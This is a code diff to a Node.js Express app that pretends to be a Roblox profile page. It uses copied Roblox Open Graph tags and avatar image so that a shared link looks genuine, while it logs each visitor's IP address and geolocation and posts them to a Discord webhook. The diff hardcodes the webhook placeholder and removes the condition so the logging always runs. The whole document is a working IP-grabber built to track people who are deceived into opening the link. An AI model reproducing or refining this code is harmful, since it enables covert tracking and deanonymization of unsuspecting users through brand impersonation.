@@ -4,7 +4,8 @@ const geoip = require('geoip-lite');
 const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
+const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // ⚠️ Replace this only
 
 app.use(requestIp.mw());
 
@@ -24,19 +25,17 @@ app.get('/', async (req, res) => {
 \`\`\`
     `;
 
-    if (process.env.WEBHOOK_URL) {
-        try {
-            await axios.post(process.env.WEBHOOK_URL, {
-                embeds: [{
-                    title: "🌐 IP Log",
-                    description: ipInfo,
-                    color: 0x3498db,
-                    timestamp: new Date().toISOString()
-                }]
-            });
-        } catch (error) {
-            console.error('Error sending to webhook');
-        }
+    try {
+        await axios.post(WEBHOOK_URL, {
+            embeds: [{
+                title: "🌐 IP Log",
+                description: ipInfo,
+                color: 0x3498db,
+                timestamp: new Date().toISOString()
+            }]
+        });
+    } catch (error) {
+        console.error('Error sending to webhook');
     }
 
     res.send(`
@@ -48,7 +47,6 @@ app.get('/', async (req, res) => {
     <meta property="og:title" content="hat_manAaccLT's Profile">
     <meta property="og:description" content="hat_manAaccLT is one of the millions creating and exploring the endless possibilities of Roblox. Join hat_manAaccLT on Roblox and explore together!">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="${process.env.DOMAIN || 'https://yourdomain.com'}">
     <meta property="og:image" content="https://tr.rbxcdn.com/30DAY-Avatar-46AD06A715B3A3129679C7AC6DE51019-Png/352/352/Avatar/Webp/noFilter">
     <meta property="og:site_name" content="Roblox">
     <meta name="theme-color" content="#333333">
